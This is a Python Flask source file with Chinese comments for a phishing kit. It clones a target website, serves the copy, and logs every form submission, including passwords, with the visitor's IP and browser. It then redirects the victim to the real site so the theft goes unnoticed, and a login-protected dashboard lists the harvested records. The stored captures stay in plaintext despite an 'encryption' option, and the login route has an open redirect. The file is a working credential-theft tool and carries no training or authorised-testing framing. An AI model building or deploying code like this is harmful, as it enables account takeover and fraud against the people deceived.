from flask import Flask, render_template, request, redirect, jsonify, session, url_for
import requests
from bs4 import BeautifulSoup
import os
import re
import json
import datetime
import hashlib
import uuid
from functools import wraps
from urllib.parse import urljoin, urlparse
from site_cloner import SiteCloner
import config

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# 存储目录
CAPTURED_DATA_DIR = 'captured_data'
CLONED_SITES_DIR = 'templates/cloned_sites'
STATIC_CLONED_DIR = 'static/cloned_sites'

# 确保目录存在
os.makedirs(CAPTURED_DATA_DIR, exist_ok=True)
os.makedirs(CLONED_SITES_DIR, exist_ok=True)
os.makedirs(STATIC_CLONED_DIR, exist_ok=True)

# 初始化站点克隆工具
site_cloner = SiteCloner()

# 认证装饰器
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if config.ENABLE_AUTH and not session.get('logged_in'):
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

# 简单加密函数
def encrypt_data(data):
    if not config.ENCRYPT_CAPTURED_DATA:
        return data
    # 这只是一个简单的加密示例，实际应用中应使用更强的加密方法
    salt = uuid.uuid4().hex
    data_str = json.dumps(data)
    hashed = hashlib.sha256((data_str + salt).encode()).hexdigest()
    return {'data': data, 'salt': salt, 'hash': hashed}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not config.ENABLE_AUTH:
        return redirect(url_for('index'))
        
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == config.ADMIN_USERNAME and password == config.ADMIN_PASSWORD:
            session['logged_in'] = True
            next_page = request.args.get('next', url_for('index'))
            return redirect(next_page)
        else:
            return render_template('login.html', error='用户名或密码错误')
            
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('index'))

@app.route('/clone', methods=['POST'])
def clone_site():
    target_url = request.form.get('url')
    if not target_url:
        return jsonify({'error': '请提供有效的URL'}), 400
    
    # 确保URL格式正确
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    try:
        # 使用站点克隆工具克隆网站
        site_id = site_cloner.clone_site(target_url)
        if not site_id:
            return jsonify({'error': '网站克隆失败'}), 500
            
        return jsonify({'success': True, 'site_id': site_id, 'url': f'/view/{site_id}'})
    
    except Exception as e:
        return jsonify({'error': f'克隆过程中出错: {str(e)}'}), 500

@app.route('/view/<site_id>')
def view_site(site_id):
    template_path = os.path.join(CLONED_SITES_DIR, site_id, 'index.html')
    if not os.path.exists(template_path):
        return "克隆站点不存在", 404
    return render_template(f'cloned_sites/{site_id}/index.html')

@app.route('/submit/<site_id>', methods=['POST'])
def submit_form(site_id):
    # 获取表单数据
    form_data = request.form.to_dict()
    original_site = form_data.get('original_site', '')
    
    # 记录捕获的数据
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # 创建捕获记录
    capture = {
        'timestamp': timestamp,
        'site_id': site_id,
        'client_ip': client_ip,
        'user_agent': user_agent,
        'form_data': form_data
    }
    
    # 过滤敏感信息（如密码）用于展示
    sensitive_fields = ['password', 'passwd', 'pass', 'pwd', 'secret', 'token']
    display_data = capture.copy()
    if 'form_data' in display_data:
        for field in sensitive_fields:
            if field in display_data['form_data']:
                display_data['form_data'][field] = '********'
    
    # 可选加密
    if config.ENCRYPT_CAPTURED_DATA:
        capture = encrypt_data(capture)
    
    # 保存捕获数据
    capture_file = os.path.join(CAPTURED_DATA_DIR, f'{site_id}_{timestamp}.json')
    with open(capture_file, 'w') as f:
        json.dump(capture, f, indent=2)
    
    # 重定向到原始站点
    if original_site:
        return redirect(original_site)
    return redirect('/')

@app.route('/captured')
@login_required
def view_captured():
    captured_files = os.listdir(CAPTURED_DATA_DIR)
    captured_data = []
    
    for filename in captured_files:
        if filename.endswith('.json'):
            file_path = os.path.join(CAPTURED_DATA_DIR, filename)
            with open(file_path, 'r') as f:
                try:
                    data = json.load(f)
                    
                    # 如果数据已加密，获取实际数据
                    if config.ENCRYPT_CAPTURED_DATA and 'data' in data:
                        data = data.get('data', {})
                    
                    # 过滤敏感信息（如密码）用于展示
                    sensitive_fields = ['password', 'passwd', 'pass', 'pwd', 'secret', 'token']
                    if 'form_data' in data:
                        for field in sensitive_fields:
                            if field in data['form_data']:
                                data['form_data'][field] = '********'
                                
                    captured_data.append(data)
                except:
                    continue
    
    # 按时间戳排序（最新的在前）
    captured_data.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return render_template('captured.html', data=captured_data)

@app.route('/clear_data', methods=['POST'])
@login_required
def clear_data():
    """清空所有捕获的数据"""
    try:
        # 删除捕获数据目录中的所有JSON文件
        for filename in os.listdir(CAPTURED_DATA_DIR):
            if filename.endswith('.json'):
                os.remove(os.path.join(CAPTURED_DATA_DIR, filename))
        return jsonify({'success': True, 'message': '所有数据已清除'})
    except Exception as e:
        return jsonify({'error': f'清除数据时出错: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(debug=config.DEBUG, port=config.PORT) 